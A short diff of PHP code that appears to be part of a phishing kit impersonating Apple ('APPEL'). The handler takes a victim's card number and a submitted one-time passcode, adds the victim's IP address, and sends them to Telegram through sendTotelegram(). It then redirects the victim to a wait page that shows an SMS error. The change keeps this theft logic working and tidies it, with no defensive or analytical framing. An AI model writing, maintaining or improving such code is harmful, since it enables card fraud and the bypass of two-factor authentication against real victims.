@@ -64,21 +64,23 @@ header("location: wait.php?next=sms.php");
 
 if(isset($_POST['otp'])){
 
-$msg = "
-APPEL - New OTP
---------------------------
-Cc: ".$_SESSION['_cc']."
-Otp: ".$_POST['otp']."
---------------------------
-IP: $ip
-";
+    $cc = $_SESSION['_cc'] ?? '';
 
-sendTotelegram($msg);
+    $msg = "
+    APPEL - New OTP
+    --------------------
+    Cc: $cc
+    Otp: ".$_POST['otp']."
+    --------------------
+    IP: $ip
+    ";
 
-if(isset($_POST['exit'])){
-    die(header("location: exit.php"));
-}
-header("location: wait.php?next=sms.php?error");
+    sendTotelegram($msg);
+
+    if(isset($_POST['exit'])){
+        die(header("location: exit.php"));
+    }
+    header("location: wait.php?next=sms.php?error");
 
 }
     
